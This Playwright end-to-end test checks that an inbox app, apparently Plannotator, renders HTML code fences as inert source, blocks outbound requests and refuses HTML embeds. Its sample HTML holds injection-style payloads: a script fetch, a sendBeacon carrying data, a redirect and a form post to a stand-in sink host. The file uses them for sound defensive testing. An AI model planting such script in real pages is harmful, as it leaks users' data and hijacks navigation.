/** HTML fences stay source while Markdown, Mermaid, DOT and SVG remain readable. */
import { expect, test } from '@playwright/test';
import { spawnSync } from 'node:child_process';
import { existsSync, realpathSync } from 'node:fs';
import { join, resolve } from 'node:path';
import { SimAgent, scratchProject } from '../../scripts/inbox-sim';
import { inboxScratch, removeInboxScratch } from './inbox-scratch';
import { NO_BROWSER } from '../helpers/no-browser';

const repo = resolve(__dirname, '../..');
const binary = resolve(process.env.PLANNOTATOR_E2E_BINARY ?? join(repo, '.local/plannotator'));
const CDN = 'https://sink.example.test';
const HTML = [
  `<meta http-equiv="refresh" content="0;url=${CDN}/navigation">`,
  `<link rel="stylesheet" href="${CDN}/style.css"><img src="${CDN}/image">`,
  `<form action="${CDN}/form"><input name="private" value="sample"></form>`,
  `<script src="${CDN}/script.js"></script>`,
  `<script>fetch('${CDN}/content');navigator.sendBeacon('${CDN}/beacon','sample');location.href='${CDN}/navigate';window.open('${CDN}/popup')</script>`,
].join('\n');
const fence = ['```html', HTML, '```'].join('\n');

interface World {
  url: string;
  /** The window's origin for direct refusal checks. */
  windowOrigin: string;
  agent: SimAgent;
  project: string;
  close(): Promise<void>;
}

async function startWorld(prefix: string): Promise<World> {
  expect(existsSync(binary), `build the binary first: ${binary}`).toBe(true);
  const scratch = inboxScratch(prefix);
  const root = realpathSync(scratch);
  const env = {
    PATH: process.env.PATH ?? '',
    HOME: root,
    USERPROFILE: root,
    LOCALAPPDATA: join(root, "AppData", "Local"),
    APPDATA: join(root, "AppData", "Roaming"),
    PLANNOTATOR_RELAY_URL: 'http://127.0.0.1:9',
    PLANNOTATOR_DATA_DIR: join(root, 'data'),
    PLANNOTATOR_BROWSER: NO_BROWSER,
    PLANNOTATOR_INBOX_CONNECT: '0',
    PLANNOTATOR_UPDATE_CHECK: '0',
  };
  try {
    const started = spawnSync(binary, ['inbox', '--background'], { env, encoding: 'utf8', timeout: 60_000 });
    expect(started.status, started.stderr).toBe(0);
    const url = started.stdout.trim();
    const windowOrigin = new URL(url).origin;
    const project = scratchProject(join(root, 'src'), 'docs');
    const agent = await SimAgent.connect({ binary, env, name: 'Claude Code', host: 'claude-code' });
    return {
      url,
      windowOrigin,
      agent,
      project,
      close: async () => {
        await agent.close().catch(() => {});
        await removeInboxScratch(scratch);
      },
    };
  } catch (error) {
    await removeInboxScratch(scratch);
    throw error;
  }
}


for (const width of [1440, 390]) {
  test(`HTML stays code without embed requests or outbound loads at ${width}px`, async ({ browser }) => {
    const world = await startWorld('plannotator-inbox-html-source-e2e-');
    const context = await browser.newContext({ viewport: { width, height: 1000 } });
    const web: string[] = [];
    await context.route(`${CDN}/**`, (route) => {
      web.push(route.request().url());
      return route.abort();
    });
    try {
      const sent = await world.agent.send({
        project_path: world.project, subject: 'Source and diagrams',
        body: [
          'Ordinary **Markdown**.', '', fence, '',
          '```mermaid', 'flowchart LR', '  A --> B', '```', '',
          '```dot', 'digraph G { A -> B }', '```', '',
          '```svg', '<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><rect width="10" height="10"/></svg>', '```',
        ].join('\n'),
      });
      const page = await context.newPage();
      const registrations: string[] = [];
      page.on('request', (request) => {
        if (new URL(request.url()).pathname === '/api/inbox/embeds') registrations.push(request.url());
      });
      await page.goto(`${world.url}#thread=${sent.thread_id}`);
      const message = page.locator(`[data-message-id="${sent.message_id as string}"]`);
      await expect(message).toContainText(HTML);
      await expect(message.locator('strong')).toContainText('Markdown');
      for (const kind of ['mermaid', 'graphviz']) {
        const diagram = message.locator(`[data-diagram-block="${kind}"]`);
        await diagram.scrollIntoViewIfNeeded();
        await expect(diagram.locator('[data-diagram-inline] svg')).toBeVisible();
      }
      await expect(message.locator('img[src^="data:image/svg+xml"]')).toHaveCount(1);
      await expect(message.locator('iframe')).toHaveCount(0);
      expect(registrations).toEqual([]);
      expect(web).toEqual([]);
      expect(context.pages()).toHaveLength(1);

      const refused = await context.request.post(`${world.windowOrigin}/api/inbox/embeds`, { data: { html: HTML } });
      expect(refused.status()).toBe(403);
      expect((await refused.json()).code).toBe('html_embeds_disabled');
      const direct = await context.request.get(`${world.windowOrigin}/api/inbox/embeds/${'a'.repeat(32)}`);
      expect(direct.status()).toBe(403);
      expect((await direct.json()).code).toBe('html_embeds_disabled');
    } finally {
      await context.close().catch(() => {});
      await world.close();
    }
  });
}
